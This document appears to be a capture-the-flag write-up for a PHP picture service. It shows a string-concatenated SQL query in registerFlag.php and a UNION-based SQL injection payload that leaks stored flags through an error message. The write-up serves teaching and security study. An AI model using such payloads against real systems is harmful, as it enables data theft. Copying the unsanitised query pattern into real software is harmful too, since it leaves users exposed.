# Syper Service

## Description

> Password-protected daily picture service for the web.

This services is provided by the team *SYPER* and is a website which provides
a random photo to every authenticated users.

The website is actually composed of 3 main pages. `index.php` which gives a
user to possibility to authenticate, `secret.php` which shows the daily
picture to authenticated users and `register.php` to register your account.

### Flag

Flag Description:

> Flags are identified by a random alphanumeric string of 20 chars.

Flags are treated in a different page which isn't really linked to the rest of
the pages. Everything is done on `registerFlag.php`.

A ``POST`` request on this page with parameters `flag_id`, `password` and
`flag_content` will register the flag if it doesn't exist.


## Vulnerabilities

If we look in `config.php` we find out the service is using 2 different
sqlite databases for flags and users:

```php
$db = new PDO('sqlite:../rw/db/messaging.sqlite3');
$flags_db = new PDO('sqlite:../rw/db/flags.sqlite3');
```

As `$flags_db` is only used in `registerFlag.php`, no need to take a look
somewhere else. In addition the SQL injection is very obvious:

```php
// Check if the flag_id is already register
$query = "SELECT * from flags where flag_id='".$_POST['flag_id']."';";
```

If a result is fetch from the database, a message is printed:

```php
if ($repeated){ echo '<h1>FAILED!</h1><BR><p> FLAG_ID: '.$row['flag_id'].' already registered<BR>';}
```

We can then take advantage of that, replacing `$row['flag_id']` with the
content of the flag instead.

## Proof of Concept

### Manual proof

We must first know the structure of the database to know in which column
the *flag* must be inserted: 

```
sqlite> .schema flags
CREATE TABLE flags (
                      id INTEGER PRIMARY KEY, 
                      flag_id TEXT,
                      flag_token TEXT,
                      flag_content TEXT, 
                      time TEXT);

```

One of the many possible SQL injection is then:

```sql
abc' AND 0 UNION SELECT 1,flag_content,3,4,5 WHERE flag_id='XXX' AND ''='
```

Here is the result with the flag in it:

![SQLi Result with flag][sqli]




[sqli]: assets/sqli_result.png
